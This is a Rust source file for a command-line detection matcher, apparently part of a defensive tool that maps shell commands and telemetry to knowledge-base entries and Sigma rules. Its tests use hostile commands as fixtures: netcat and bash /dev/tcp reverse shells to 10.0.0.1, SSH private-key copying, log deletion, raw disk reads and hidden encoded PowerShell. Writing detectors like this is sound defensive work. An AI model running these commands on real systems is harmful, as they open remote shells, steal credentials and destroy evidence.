//! The structured matcher. A [`Matcher`] is a small, hand-authorable predicate
//! over a parsed [`Command`] and its raw line — the single matching schema a
//! knowledge-base entry carries (under its `match` key). It describes
//! *detectability* only — "what would a defender see?" — and encodes no evasion
//! semantics.
//!
//! ## The three axes
//! - `program` — who ran: an exact basename or an any-of set.
//! - `args`   — a predicate tree over the resolved argument vector.
//! - `line`   — a predicate over the whole raw line (for redirections, pipes,
//!   and markers that span tokens).
//!
//! Leaf predicates such as `word` (word-boundary) and `path_under`
//! (path-segment aware) exist to kill the substring false positives that plain
//! `contains` produced — e.g. `/var/log` matching `cd /var/log`, or `id_rsa`
//! matching `id_rsa_notes.txt`.

use std::collections::HashMap;

use serde::Deserialize;

use crate::parser::Command;

/// A structured predicate matching a parsed command within its raw line.
///
/// The command axes (`program` / `args` / `line`) are optional. When `program`
/// is present the matcher is command-scoped: some command in the unit must
/// satisfy `program` (and `args` / `line`, if given). When `program` is absent
/// the matcher is line-scoped: the raw line must satisfy `line`. The `event` axis
/// is orthogonal: it matches a *non-execution* record (network / file / registry)
/// by its fields rather than a command line, for entries recognized from
/// standalone telemetry with no captured `execve`.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Matcher {
    /// Who ran: the resolved program basename. `None` places no constraint.
    #[serde(default)]
    pub program: Option<ProgramMatch>,
    /// A predicate tree over the resolved argument vector. `None` places no
    /// constraint.
    #[serde(default)]
    pub args: Option<ArgPred>,
    /// A predicate over the whole raw line, for markers that span tokens.
    /// `None` places no constraint.
    #[serde(default)]
    pub line: Option<LinePred>,
    /// A predicate over a non-execution record's fields. Orthogonal to the
    /// three axes above — an entry carrying this is recognized from standalone
    /// telemetry, with no command line involved.
    #[serde(default)]
    pub event: Option<EventMatch>,
}

/// A predicate over a non-execution event's fields: the event `class`
/// (`network` / `file` / `registry`) and a single string test (`contains` or
/// `eq`, case-insensitive) on one named `field` (e.g. a registry `TargetObject`).
/// Deliberately small — hand-authorable, and evaluated against the same field map
/// the ingest builds for observed Sigma evaluation.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct EventMatch {
    /// The event class this applies to: `network`, `file`, or `registry`.
    pub class: String,
    /// The single event field to test, by its canonical name (e.g. a registry
    /// `TargetObject`).
    pub field: String,
    /// The field must contain this substring, case-insensitively. Mutually
    /// exclusive with `eq`; exactly one of the two is required.
    #[serde(default)]
    pub contains: Option<String>,
    /// The field must equal this string, case-insensitively. Mutually exclusive
    /// with `contains`; exactly one of the two is required.
    #[serde(default)]
    pub eq: Option<String>,
}

impl EventMatch {
    /// Exactly one of `contains` / `eq` must be set and non-empty. Neither, both,
    /// or an empty predicate is a knowledge-base authoring mistake — an empty
    /// `contains` would otherwise match every value — so it is rejected at load
    /// (see [`crate::model::KnowledgeBase::validate`]) rather than matching broadly.
    pub fn validate(&self) -> Result<(), String> {
        match (self.contains.as_deref(), self.eq.as_deref()) {
            (Some(_), Some(_)) => Err("event match sets both `contains` and `eq`".into()),
            (None, None) => Err("event match sets neither `contains` nor `eq`".into()),
            (Some(""), None) | (None, Some("")) => Err("event match predicate is empty".into()),
            _ => Ok(()),
        }
    }

    /// Whether this predicate holds for a record of the given `class` and fields.
    /// An empty or ambiguous predicate never matches (it is rejected at load, but
    /// `eval` is explicit rather than relying on that).
    fn eval(&self, class: &str, fields: &HashMap<String, String>) -> bool {
        if !self.class.eq_ignore_ascii_case(class) {
            return false;
        }
        let Some(val) = fields.get(&self.field) else {
            return false;
        };
        match (self.contains.as_deref(), self.eq.as_deref()) {
            (Some(needle), None) if !needle.is_empty() => {
                val.to_lowercase().contains(&needle.to_lowercase())
            }
            (None, Some(exact)) if !exact.is_empty() => val.eq_ignore_ascii_case(exact),
            _ => false,
        }
    }
}

/// How to match the program basename: exact (a bare string) or any-of a set.
#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
pub enum ProgramMatch {
    /// `"program": "curl"` — exact basename, case-insensitive.
    Exact(String),
    /// `"program": { "any": ["nc", "ncat"] }` — any of these basenames.
    AnyOf {
        /// The accepted basenames, case-insensitive.
        any: Vec<String>,
    },
}

/// A predicate over a command's argument vector. Leaf predicates are
/// *existential over the arguments* ("some argument satisfies this"); the
/// `all` / `any` / `not` combinators compose predicates, not arguments.
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ArgPred {
    /// Every sub-predicate holds.
    All(Vec<ArgPred>),
    /// Some sub-predicate holds.
    Any(Vec<ArgPred>),
    /// The sub-predicate does not hold (e.g. a flag is absent).
    Not(Box<ArgPred>),
    /// Some argument equals this flag token exactly (case-insensitive), e.g. `-e`.
    Flag(String),
    /// Some argument equals this string (case-insensitive).
    Eq(String),
    /// Some argument contains this substring.
    Contains(String),
    /// Some argument starts with this string.
    Prefix(String),
    /// Some argument ends with this string.
    Suffix(String),
    /// Some argument contains this token on word boundaries.
    Word(String),
    /// Some argument is a path equal to, or nested under, this directory
    /// (segment-aware: `/var/log/nginx` is under `/var/log`; `/var/logistics`
    /// is not).
    PathUnder(String),
    /// The argument at a fixed position satisfies a leaf string match.
    At(PosMatch),
    /// A leaf string match against all arguments joined by spaces — for a phrase
    /// that spans several argument tokens, e.g. `process call create`.
    Joined(StrLeaf),
    /// Some argument matches this regular expression (case-insensitive).
    Regex(Re),
}

/// A positional argument match: the argument at `index` must satisfy `value`.
#[derive(Debug, Clone, Deserialize)]
pub struct PosMatch {
    /// 0-based position in the argument vector, not counting the program.
    pub index: usize,
    /// The test the argument at `index` must satisfy.
    pub value: StrLeaf,
}

/// A predicate over the whole raw line, for markers that span tokens
/// (redirections, pipes, socket paths).
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LinePred {
    /// Every sub-predicate holds.
    All(Vec<LinePred>),
    /// Some sub-predicate holds.
    Any(Vec<LinePred>),
    /// The sub-predicate does not hold.
    Not(Box<LinePred>),
    /// The line contains this substring (case-insensitive).
    Contains(String),
    /// The line contains this token on word boundaries.
    Word(String),
    /// The line starts with this string.
    Prefix(String),
    /// The line ends with this string.
    Suffix(String),
    /// The line matches this regular expression (case-insensitive).
    Regex(Re),
}

/// A leaf string match against a single value (used by `at` and `joined`).
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StrLeaf {
    /// The value equals this string, case-insensitively.
    Eq(String),
    /// The value contains this substring, case-insensitively.
    Contains(String),
    /// The value starts with this string.
    Prefix(String),
    /// The value ends with this string.
    Suffix(String),
    /// The value contains this token on word boundaries — `id_rsa` matches
    /// `id_rsa` but not `id_rsa_notes.txt`.
    Word(String),
    /// A regular expression (case-insensitive) the value must match.
    Regex(Re),
}

/// A compiled regular expression, deserialized from its source string. The
/// pattern is compiled once at knowledge-base load — an invalid pattern is a
/// load-time error, not a silent no-match — and matched case-insensitively for
/// consistency with the other leaves. Author-facing: an entry that uses a
/// `regex` leaf must also carry an `example`, since a pattern (unlike a literal)
/// cannot be reversed into a representative command (see `KbEntry::example`).
#[derive(Debug, Clone)]
pub struct Re {
    src: String,
    re: regex::Regex,
}

impl Re {
    fn is_match(&self, value: &str) -> bool {
        self.re.is_match(value)
    }

    /// The original pattern source (for scaffolding a Sigma `|re` selection).
    pub fn as_str(&self) -> &str {
        &self.src
    }
}

impl<'de> Deserialize<'de> for Re {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let src = String::deserialize(deserializer)?;
        let re = regex::RegexBuilder::new(&src)
            .case_insensitive(true)
            .build()
            .map_err(serde::de::Error::custom)?;
        Ok(Re { src, re })
    }
}

// --- matching engine -------------------------------------------------------

impl Matcher {
    /// Whether this entry's `event` axis matches a non-execution record of the
    /// given `class` and field map. `false` for a command-only matcher.
    pub fn evaluate_event(&self, class: &str, fields: &HashMap<String, String>) -> bool {
        self.event.as_ref().is_some_and(|e| e.eval(class, fields))
    }

    /// Evaluate the matcher against a unit's commands and its raw line.
    ///
    /// Returns `None` when the matcher does not apply. Returns `Some(mc)` when it
    /// does, where `mc` is the specific command that matched (for command-scoped
    /// matchers) or the unit's first command (for line-scoped matchers) — the
    /// `matched_command` that downstream coverage/Sigma evaluation keys on.
    pub fn evaluate(&self, commands: &[Command], raw: &str) -> Option<Option<Command>> {
        if self.program.is_some() {
            commands
                .iter()
                .find(|c| self.matches_command(c, raw))
                .cloned()
                .map(Some)
        } else {
            // Line-scoped: with no `program` and no `line`, a matcher matches
            // nothing.
            let line = self.line.as_ref()?;
            line.eval(raw).then(|| commands.first().cloned())
        }
    }

    /// Does a single command satisfy every present axis of this matcher?
    fn matches_command(&self, cmd: &Command, raw: &str) -> bool {
        if let Some(p) = &self.program
            && !p.matches(&cmd.program)
        {
            return false;
        }
        if let Some(a) = &self.args
            && !a.eval(&cmd.args)
        {
            return false;
        }
        if let Some(l) = &self.line
            && !l.eval(raw)
        {
            return false;
        }
        true
    }
}

impl ProgramMatch {
    fn matches(&self, program: &str) -> bool {
        match self {
            ProgramMatch::Exact(p) => program.eq_ignore_ascii_case(p),
            ProgramMatch::AnyOf { any } => any.iter().any(|p| program.eq_ignore_ascii_case(p)),
        }
    }
}

impl ArgPred {
    fn eval(&self, args: &[String]) -> bool {
        match self {
            ArgPred::All(v) => v.iter().all(|p| p.eval(args)),
            ArgPred::Any(v) => v.iter().any(|p| p.eval(args)),
            ArgPred::Not(p) => !p.eval(args),
            ArgPred::Flag(f) => args.iter().any(|a| a.eq_ignore_ascii_case(f)),
            ArgPred::Eq(s) => args.iter().any(|a| a.eq_ignore_ascii_case(s)),
            ArgPred::Contains(s) => args.iter().any(|a| contains_ci(a, s)),
            ArgPred::Prefix(s) => args.iter().any(|a| starts_with_ci(a, s)),
            ArgPred::Suffix(s) => args.iter().any(|a| ends_with_ci(a, s)),
            ArgPred::Word(s) => args.iter().any(|a| word_match(a, s)),
            ArgPred::PathUnder(base) => args.iter().any(|a| path_under(a, base)),
            ArgPred::At(pos) => args.get(pos.index).is_some_and(|a| pos.value.eval(a)),
            ArgPred::Joined(leaf) => leaf.eval(&args.join(" ")),
            ArgPred::Regex(re) => args.iter().any(|a| re.is_match(a)),
        }
    }

    fn has_regex(&self) -> bool {
        match self {
            ArgPred::All(v) | ArgPred::Any(v) => v.iter().any(ArgPred::has_regex),
            ArgPred::Not(p) => p.has_regex(),
            ArgPred::At(pos) => pos.value.is_regex(),
            ArgPred::Joined(leaf) => leaf.is_regex(),
            ArgPred::Regex(_) => true,
            _ => false,
        }
    }
}

impl LinePred {
    fn eval(&self, line: &str) -> bool {
        match self {
            LinePred::All(v) => v.iter().all(|p| p.eval(line)),
            LinePred::Any(v) => v.iter().any(|p| p.eval(line)),
            LinePred::Not(p) => !p.eval(line),
            LinePred::Contains(s) => contains_ci(line, s),
            LinePred::Word(s) => word_match(line, s),
            LinePred::Prefix(s) => starts_with_ci(line, s),
            LinePred::Suffix(s) => ends_with_ci(line, s),
            LinePred::Regex(re) => re.is_match(line),
        }
    }

    fn has_regex(&self) -> bool {
        match self {
            LinePred::All(v) | LinePred::Any(v) => v.iter().any(LinePred::has_regex),
            LinePred::Not(p) => p.has_regex(),
            LinePred::Regex(_) => true,
            _ => false,
        }
    }
}

impl StrLeaf {
    fn eval(&self, value: &str) -> bool {
        match self {
            StrLeaf::Eq(s) => value.eq_ignore_ascii_case(s),
            StrLeaf::Contains(s) => contains_ci(value, s),
            StrLeaf::Prefix(s) => starts_with_ci(value, s),
            StrLeaf::Suffix(s) => ends_with_ci(value, s),
            StrLeaf::Word(s) => word_match(value, s),
            StrLeaf::Regex(re) => re.is_match(value),
        }
    }

    fn is_regex(&self) -> bool {
        matches!(self, StrLeaf::Regex(_))
    }
}

// --- leaf helpers ----------------------------------------------------------

fn contains_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().contains(&needle.to_lowercase())
}

fn starts_with_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().starts_with(&needle.to_lowercase())
}

fn ends_with_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().ends_with(&needle.to_lowercase())
}

/// Case-insensitive substring match requiring a non-word character (or the
/// string edge) on both sides. A "word character" is `[A-Za-z0-9_]`. This is
/// what stops `id_rsa` from matching inside `id_rsa_notes.txt`.
fn word_match(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    let h = haystack.to_lowercase();
    let n = needle.to_lowercase();
    let hb = h.as_bytes();
    let is_word = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut from = 0;
    while let Some(rel) = h[from..].find(&n) {
        let i = from + rel;
        let before_ok = i == 0 || !is_word(hb[i - 1]);
        let after = i + n.len();
        let after_ok = after >= hb.len() || !is_word(hb[after]);
        if before_ok && after_ok {
            return true;
        }
        from = i + 1;
    }
    false
}

/// Is `arg`, read as a filesystem path, equal to or nested under `base`? Compares
/// whole path segments (case-insensitive, trailing slashes ignored), so
/// `/var/log/nginx` is under `/var/log` but `/var/logistics` is not.
fn path_under(arg: &str, base: &str) -> bool {
    let a = arg.to_lowercase();
    let b = base.to_lowercase();
    let a = a.trim_end_matches('/');
    let b = b.trim_end_matches('/');
    if b.is_empty() {
        return false;
    }
    a == b || a.starts_with(&format!("{b}/"))
}

// --- representative derivation ---------------------------------------------
//
// Downstream tooling (`verify`, `scaffold`) needs to turn a matcher back into a
// concrete example: a command line that the matcher would match, and the
// CommandLine substrings a mirroring Sigma `selection` should test. Both are
// derived by walking the predicate tree for the literals a match keys on.

impl Matcher {
    /// Lower the matcher into the fields a starter Sigma `selection:` should
    /// test (see [`SigmaSelection`]). Program any-of and an `any`-of-`contains`
    /// group become OR-lists; everything else is ANDed. `simplified` is set when
    /// the matcher uses alternation/nesting that a flat selection can't mirror,
    /// so the scaffold flags it for review instead of silently narrowing.
    pub fn sigma_selection(&self) -> SigmaSelection {
        let mut sel = SigmaSelection::default();
        match &self.program {
            Some(ProgramMatch::Exact(p)) => sel.image_endswith.push(p.clone()),
            Some(ProgramMatch::AnyOf { any }) => sel.image_endswith.extend(any.iter().cloned()),
            None => {}
        }
        if let Some(a) = &self.args {
            lower_arg_selection(a, &mut sel);
        }
        if let Some(l) = &self.line {
            lower_line_selection(l, &mut sel);
        }
        // A flat `CommandLine|contains` field can't hold both an AND set and a
        // separate OR-group; when both are present the OR-group is dropped at
        // render time, so flag it.
        if !sel.contains_all.is_empty() && !sel.contains_any.is_empty() {
            sel.simplified = true;
        }
        sel
    }

    /// Whether any leaf in this matcher is a `regex`. Such an entry cannot derive
    /// its own representative from literals, so it must carry an `example`.
    pub fn has_regex(&self) -> bool {
        self.args.as_ref().is_some_and(ArgPred::has_regex)
            || self.line.as_ref().is_some_and(LinePred::has_regex)
    }

    /// A representative command line that this matcher would match, for
    /// synthesizing an example event. Returns `None` when nothing positive can
    /// be derived (e.g. a bare or purely-negated matcher).
    ///
    /// Argument literals are placed positionally so that `at` predicates land at
    /// the index they require (padding earlier positions with a filler token);
    /// existential leaves fill any free slot. Line literals are appended so the
    /// raw line carries them.
    pub fn representative_line(&self) -> Option<String> {
        let mut parts: Vec<String> = Vec::new();
        if let Some(prog) = self.program_representative() {
            parts.push(prog);
        }
        if let Some(a) = &self.args {
            parts.extend(representative_args(a));
        }
        if let Some(l) = &self.line {
            collect_line_terms(l, &mut parts);
        }
        let line = parts.join(" ");
        let line = line.trim();
        (!line.is_empty()).then(|| line.to_string())
    }

    /// A representative program basename (exact value, or the first of an
    /// any-of set).
    fn program_representative(&self) -> Option<String> {
        match &self.program {
            Some(ProgramMatch::Exact(p)) => Some(p.clone()),
            Some(ProgramMatch::AnyOf { any }) => any.first().cloned(),
            None => None,
        }
    }
}

/// Filler token used to pad argument positions with no constraint of their own,
/// so a later `at` index can be reached. Chosen to be inert: it satisfies no
/// leaf a real matcher keys on and trips no typical negation.
const ARG_FILLER: &str = "_";

/// Build a representative argument vector satisfying `pred`, honoring `at`
/// positions. Positional constraints fix specific indices; existential leaves
/// fill free slots (or append); gaps before a positional index get a filler.
fn representative_args(pred: &ArgPred) -> Vec<String> {
    let mut positional: Vec<(usize, String)> = Vec::new();
    let mut floating: Vec<String> = Vec::new();
    collect_arg_repr(pred, &mut positional, &mut floating);

    let size = positional.iter().map(|(i, _)| i + 1).max().unwrap_or(0);
    let mut slots: Vec<Option<String>> = vec![None; size];
    for (i, lit) in positional {
        slots[i] = Some(lit); // last write wins on a (pathological) index clash
    }

    let mut floating = floating.into_iter();
    let mut out: Vec<String> = slots
        .into_iter()
        .map(|slot| {
            slot.or_else(|| floating.next())
                .unwrap_or_else(|| ARG_FILLER.to_string())
        })
        .collect();
    out.extend(floating); // any existential literals beyond the fixed positions
    out
}

/// Split an argument predicate into positional `(index, literal)` constraints
/// (from `at`) and order-independent existential literals (everything else).
/// `any` takes its first branch; `not` contributes nothing positive.
fn collect_arg_repr(
    pred: &ArgPred,
    positional: &mut Vec<(usize, String)>,
    floating: &mut Vec<String>,
) {
    match pred {
        ArgPred::All(v) => v
            .iter()
            .for_each(|p| collect_arg_repr(p, positional, floating)),
        ArgPred::Any(v) => {
            if let Some(first) = v.first() {
                collect_arg_repr(first, positional, floating);
            }
        }
        ArgPred::Not(_) => {}
        ArgPred::Flag(s)
        | ArgPred::Eq(s)
        | ArgPred::Contains(s)
        | ArgPred::Prefix(s)
        | ArgPred::Suffix(s)
        | ArgPred::Word(s)
        | ArgPred::PathUnder(s) => floating.push(s.clone()),
        ArgPred::At(pos) => {
            if let Some(lit) = str_leaf_literal(&pos.value) {
                positional.push((pos.index, lit));
            }
        }
        ArgPred::Joined(leaf) => {
            if let Some(lit) = str_leaf_literal(leaf) {
                floating.push(lit);
            }
        }
        ArgPred::Regex(_) => {}
    }
}

/// A Sigma-friendly lowering of a matcher for scaffolding — the fields a starter
/// `selection:` should test (see [`Matcher::sigma_selection`]).
#[derive(Debug, Default)]
pub struct SigmaSelection {
    /// `Image|endswith` values: one for an exact program, several (OR) for any-of.
    pub image_endswith: Vec<String>,
    /// `CommandLine|contains` literals ANDed together.
    pub contains_all: Vec<String>,
    /// One `CommandLine|contains` OR-group (from an `any` of contains-like leaves).
    pub contains_any: Vec<String>,
    /// `CommandLine|re` patterns.
    pub regexes: Vec<String>,
    /// Set when alternation/nesting couldn't be represented faithfully, so the
    /// scaffold can flag itself for review instead of silently narrowing.
    pub simplified: bool,
}

/// Record an OR-group of contains literals. A matcher can carry only one such
/// group in a single flat selection; a second is flagged as `simplified`.
fn add_or_group(sel: &mut SigmaSelection, lits: Vec<String>) {
    if sel.contains_any.is_empty() {
        sel.contains_any = lits;
    } else {
        sel.simplified = true;
    }
}

/// Lower an argument predicate into the selection. `all` ANDs its children; an
/// `any` of plain contains-like leaves becomes the OR-group. A nested `any`
/// falls back to its first branch, and a `not` is dropped (unrepresentable in a
/// positive selection); both mark `simplified` so the scaffold warns.
fn lower_arg_selection(pred: &ArgPred, sel: &mut SigmaSelection) {
    match pred {
        ArgPred::All(v) => v.iter().for_each(|p| lower_arg_selection(p, sel)),
        ArgPred::Any(v) => match arg_or_literals(v) {
            Some(lits) => add_or_group(sel, lits),
            None => {
                sel.simplified = true;
                if let Some(first) = v.first() {
                    lower_arg_selection(first, sel);
                }
            }
        },
        // A `not` can't be expressed in a positive Sigma `selection:` field;
        // dropping it broadens the scaffold, so flag the loss.
        ArgPred::Not(_) => sel.simplified = true,
        ArgPred::Flag(s)
        | ArgPred::Eq(s)
        | ArgPred::Contains(s)
        | ArgPred::Prefix(s)
        | ArgPred::Suffix(s)
        | ArgPred::Word(s)
        | ArgPred::PathUnder(s) => sel.contains_all.push(s.clone()),
        ArgPred::At(PosMatch {
            value: StrLeaf::Regex(re),
            ..
        })
        | ArgPred::Joined(StrLeaf::Regex(re))
        | ArgPred::Regex(re) => sel.regexes.push(re.as_str().to_string()),
        ArgPred::At(pos) => sel.contains_all.extend(str_leaf_literal(&pos.value)),
        ArgPred::Joined(leaf) => sel.contains_all.extend(str_leaf_literal(leaf)),
    }
}

/// Lower a line predicate into the selection (see [`lower_arg_selection`]).
fn lower_line_selection(pred: &LinePred, sel: &mut SigmaSelection) {
    match pred {
        LinePred::All(v) => v.iter().for_each(|p| lower_line_selection(p, sel)),
        LinePred::Any(v) => match line_or_literals(v) {
            Some(lits) => add_or_group(sel, lits),
            None => {
                sel.simplified = true;
                if let Some(first) = v.first() {
                    lower_line_selection(first, sel);
                }
            }
        },
        // See `lower_arg_selection`: a dropped `not` broadens the scaffold.
        LinePred::Not(_) => sel.simplified = true,
        LinePred::Contains(s) | LinePred::Word(s) | LinePred::Prefix(s) | LinePred::Suffix(s) => {
            sel.contains_all.push(s.clone())
        }
        LinePred::Regex(re) => sel.regexes.push(re.as_str().to_string()),
    }
}

/// `Some(literals)` iff every branch is a plain contains-like leaf, so the `any`
/// can render as one `CommandLine|contains` OR-list; `None` otherwise.
fn arg_or_literals(branches: &[ArgPred]) -> Option<Vec<String>> {
    branches
        .iter()
        .map(|b| match b {
            ArgPred::Flag(s)
            | ArgPred::Eq(s)
            | ArgPred::Contains(s)
            | ArgPred::Prefix(s)
            | ArgPred::Suffix(s)
            | ArgPred::Word(s)
            | ArgPred::PathUnder(s) => Some(s.clone()),
            _ => None,
        })
        .collect()
}

fn line_or_literals(branches: &[LinePred]) -> Option<Vec<String>> {
    branches
        .iter()
        .map(|b| match b {
            LinePred::Contains(s)
            | LinePred::Word(s)
            | LinePred::Prefix(s)
            | LinePred::Suffix(s) => Some(s.clone()),
            _ => None,
        })
        .collect()
}

/// Collect literals from a line predicate.
fn collect_line_terms(pred: &LinePred, out: &mut Vec<String>) {
    match pred {
        LinePred::All(v) => v.iter().for_each(|p| collect_line_terms(p, out)),
        LinePred::Any(v) => {
            if let Some(first) = v.first() {
                collect_line_terms(first, out);
            }
        }
        LinePred::Not(_) => {}
        LinePred::Contains(s) | LinePred::Word(s) | LinePred::Prefix(s) | LinePred::Suffix(s) => {
            out.push(s.clone())
        }
        LinePred::Regex(_) => {}
    }
}

/// The literal a leaf keys on, or `None` for a `regex` leaf (a pattern cannot be
/// reversed into a literal — such entries rely on `KbEntry::example`).
fn str_leaf_literal(leaf: &StrLeaf) -> Option<String> {
    match leaf {
        StrLeaf::Eq(s)
        | StrLeaf::Contains(s)
        | StrLeaf::Prefix(s)
        | StrLeaf::Suffix(s)
        | StrLeaf::Word(s) => Some(s.clone()),
        StrLeaf::Regex(_) => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::parse_line;

    fn m(json: &str) -> Matcher {
        serde_json::from_str(json).expect("matcher parses")
    }

    /// Evaluate a matcher against a raw command line the way the analyzer does.
    fn matches(matcher: &Matcher, line: &str) -> bool {
        let commands = parse_line(line);
        matcher.evaluate(&commands, line.trim()).is_some()
    }

    #[test]
    fn program_exact_and_any_of() {
        let exact = m(r#"{ "program": "curl" }"#);
        assert!(matches(&exact, "curl http://x/y"));
        assert!(!matches(&exact, "wget http://x/y"));
        // Case-insensitive and wrapper-stripped (sudo) and path-normalized.
        assert!(matches(&exact, "sudo /usr/bin/CURL http://x"));

        let set = m(r#"{ "program": { "any": ["nc", "ncat"] } }"#);
        assert!(matches(&set, "nc -e /bin/sh 10.0.0.1 4444"));
        assert!(matches(&set, "ncat 10.0.0.1 4444"));
        assert!(!matches(&set, "socat - tcp:10.0.0.1:4444"));
    }

    #[test]
    fn flags_and_alternation() {
        let rev = m(r#"{
            "program": { "any": ["nc", "ncat"] },
            "args": { "all": [
                { "flag": "-e" },
                { "any": [ {"eq": "/bin/sh"}, {"eq": "/bin/bash"} ] }
            ] }
        }"#);
        assert!(matches(&rev, "nc -e /bin/sh 10.0.0.1 4444"));
        assert!(matches(&rev, "ncat -e /bin/bash 1.2.3.4 9001"));
        // Missing -e, or a different shell → no match.
        assert!(!matches(&rev, "nc /bin/sh 10.0.0.1 4444"));
        assert!(!matches(&rev, "nc -e /bin/zsh 10.0.0.1 4444"));
    }

    #[test]
    fn negation_of_a_flag() {
        // "tar creating an archive, but not listing" — contrived, exercises not.
        let pred = m(r#"{ "program": "tar", "args": { "all": [
            { "flag": "-c" }, { "not": { "flag": "-t" } }
        ] } }"#);
        assert!(matches(&pred, "tar -c -f out.tar /etc"));
        assert!(!matches(&pred, "tar -c -t -f out.tar"));
    }

    #[test]
    fn path_under_is_segment_aware() {
        let clear = m(r#"{ "program": "rm", "args": { "path_under": "/var/log" } }"#);
        assert!(matches(&clear, "rm -rf /var/log/nginx"));
        assert!(matches(&clear, "rm -rf /var/log")); // the directory itself
        // Not under /var/log — the substring FP the old matcher had.
        assert!(!matches(&clear, "rm -rf /var/logistics"));
        assert!(!matches(&clear, "cd /var/log && rm -rf target/debug"));
    }

    #[test]
    fn word_boundary_kills_substring_fp() {
        let key = m(r#"{ "line": { "word": "id_rsa" } }"#);
        assert!(matches(&key, "cp ~/.ssh/id_rsa /tmp/k"));
        assert!(matches(&key, "cat id_rsa")); // exact token
        // A different filename that merely contains the token is not a match.
        assert!(!matches(&key, "vim id_rsa_backup_notes.txt"));
    }

    #[test]
    fn positional_argument() {
        let pred = m(r#"{ "program": "dd", "args": {
            "at": { "index": 0, "value": { "prefix": "if=/dev/" } }
        } }"#);
        assert!(matches(&pred, "dd if=/dev/sda of=/tmp/disk.img"));
        assert!(!matches(&pred, "dd of=/tmp/x if=/dev/sda")); // not at index 0
    }

    #[test]
    fn line_predicate_contains() {
        let rev = m(r#"{ "line": { "contains": "/dev/tcp" } }"#);
        assert!(matches(&rev, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
        assert!(!matches(&rev, "echo hello"));
    }

    #[test]
    fn representative_round_trips_through_the_engine() {
        for json in [
            r#"{ "program": "curl" }"#,
            r#"{ "program": "rm", "args": { "path_under": "/var/log" } }"#,
            r#"{ "program": { "any": ["nc", "ncat"] }, "args": { "all": [
                { "flag": "-e" }, { "any": [ {"eq": "/bin/sh"} ] } ] } }"#,
            r#"{ "line": { "contains": "/dev/tcp" } }"#,
            r#"{ "line": { "word": "id_rsa" } }"#,
            // Positional `at` beyond index 0: the representative must place the
            // literal at the requested index (padding earlier positions), and a
            // co-occurring existential leaf must still be satisfied.
            r#"{ "program": "x", "args": { "all": [
                { "at": { "index": 2, "value": { "eq": "foo" } } },
                { "flag": "-z" } ] } }"#,
        ] {
            let matcher = m(json);
            let repr = matcher
                .representative_line()
                .unwrap_or_else(|| panic!("no representative for {json}"));
            assert!(
                matches(&matcher, &repr),
                "representative `{repr}` did not match its own matcher {json}",
            );
        }
    }

    #[test]
    fn event_axis_matches_class_and_field() {
        let reg = m(
            r#"{ "event": { "class": "registry", "field": "TargetObject", "contains": "\\Run" } }"#,
        );
        let mut fields = HashMap::new();
        fields.insert(
            "TargetObject".to_string(),
            "HKLM\\...\\CurrentVersion\\Run\\x".to_string(),
        );
        assert!(reg.evaluate_event("registry", &fields));
        assert!(!reg.evaluate_event("file", &fields)); // class mismatch
        assert!(!reg.evaluate_event("registry", &HashMap::new())); // field absent
        // A command-scoped matcher never matches an event.
        assert!(!m(r#"{ "program": "reg" }"#).evaluate_event("registry", &fields));
        // …and an event matcher does not match a command line.
        assert!(reg.evaluate(&[], "reg add HKLM").is_none());
    }

    #[test]
    fn event_match_rejects_empty_or_ambiguous_predicate() {
        let ev = |json: &str| m(json).event.expect("has event");
        assert!(
            ev(r#"{ "event": { "class": "registry", "field": "T", "contains": "x" } }"#)
                .validate()
                .is_ok()
        );
        // Both predicates set — ambiguous.
        assert!(
            ev(r#"{ "event": { "class": "registry", "field": "T", "contains": "x", "eq": "y" } }"#)
                .validate()
                .is_err()
        );
        // Neither set.
        assert!(
            ev(r#"{ "event": { "class": "registry", "field": "T" } }"#)
                .validate()
                .is_err()
        );
        // Empty `contains` would otherwise match every value — rejected, and never
        // matches even if it slipped through.
        let empty = m(r#"{ "event": { "class": "registry", "field": "T", "contains": "" } }"#);
        assert!(empty.event.as_ref().unwrap().validate().is_err());
        let mut fields = HashMap::new();
        fields.insert("T".to_string(), "anything".to_string());
        assert!(!empty.evaluate_event("registry", &fields));
    }

    #[test]
    fn sigma_selection_program_and_anded_terms() {
        let matcher = m(r#"{ "program": "x", "args": { "contains": "aaa" },
                             "line": { "contains": "bbb" } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.image_endswith, vec!["x"]);
        assert_eq!(sel.contains_all, vec!["aaa", "bbb"]);
        assert!(sel.contains_any.is_empty() && !sel.simplified);
    }

    #[test]
    fn sigma_selection_lowers_alternation_to_or_groups() {
        // Program any-of -> Image list; an `any` of contains -> a CommandLine OR
        // group; neither is a lossy narrowing.
        let matcher = m(r#"{ "program": { "any": ["net", "net1"] },
                             "line": { "any": [ {"contains": "a"}, {"contains": "b"} ] } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.image_endswith, vec!["net", "net1"]);
        assert_eq!(sel.contains_any, vec!["a", "b"]);
        assert!(sel.contains_all.is_empty() && !sel.simplified);
    }

    #[test]
    fn unknown_field_is_rejected() {
        // A typo'd axis must fail loudly rather than silently match nothing.
        let err = serde_json::from_str::<Matcher>(r#"{ "programm": "curl" }"#);
        assert!(err.is_err());
    }

    #[test]
    fn regex_leaf_on_line_and_args() {
        // Line regex, case-insensitive, anchored with a word boundary.
        let line = m(r#"{ "line": { "regex": "-w\\s+(hidden|1)\\b" } }"#);
        assert!(matches(&line, "powershell -w hidden -enc AA=="));
        assert!(matches(&line, "powershell -W HIDDEN")); // case-insensitive
        assert!(matches(&line, "powershell -w 1"));
        assert!(!matches(&line, "echo -w hiddenish")); // \b stops the partial word

        // Arg regex is existential over the argument vector.
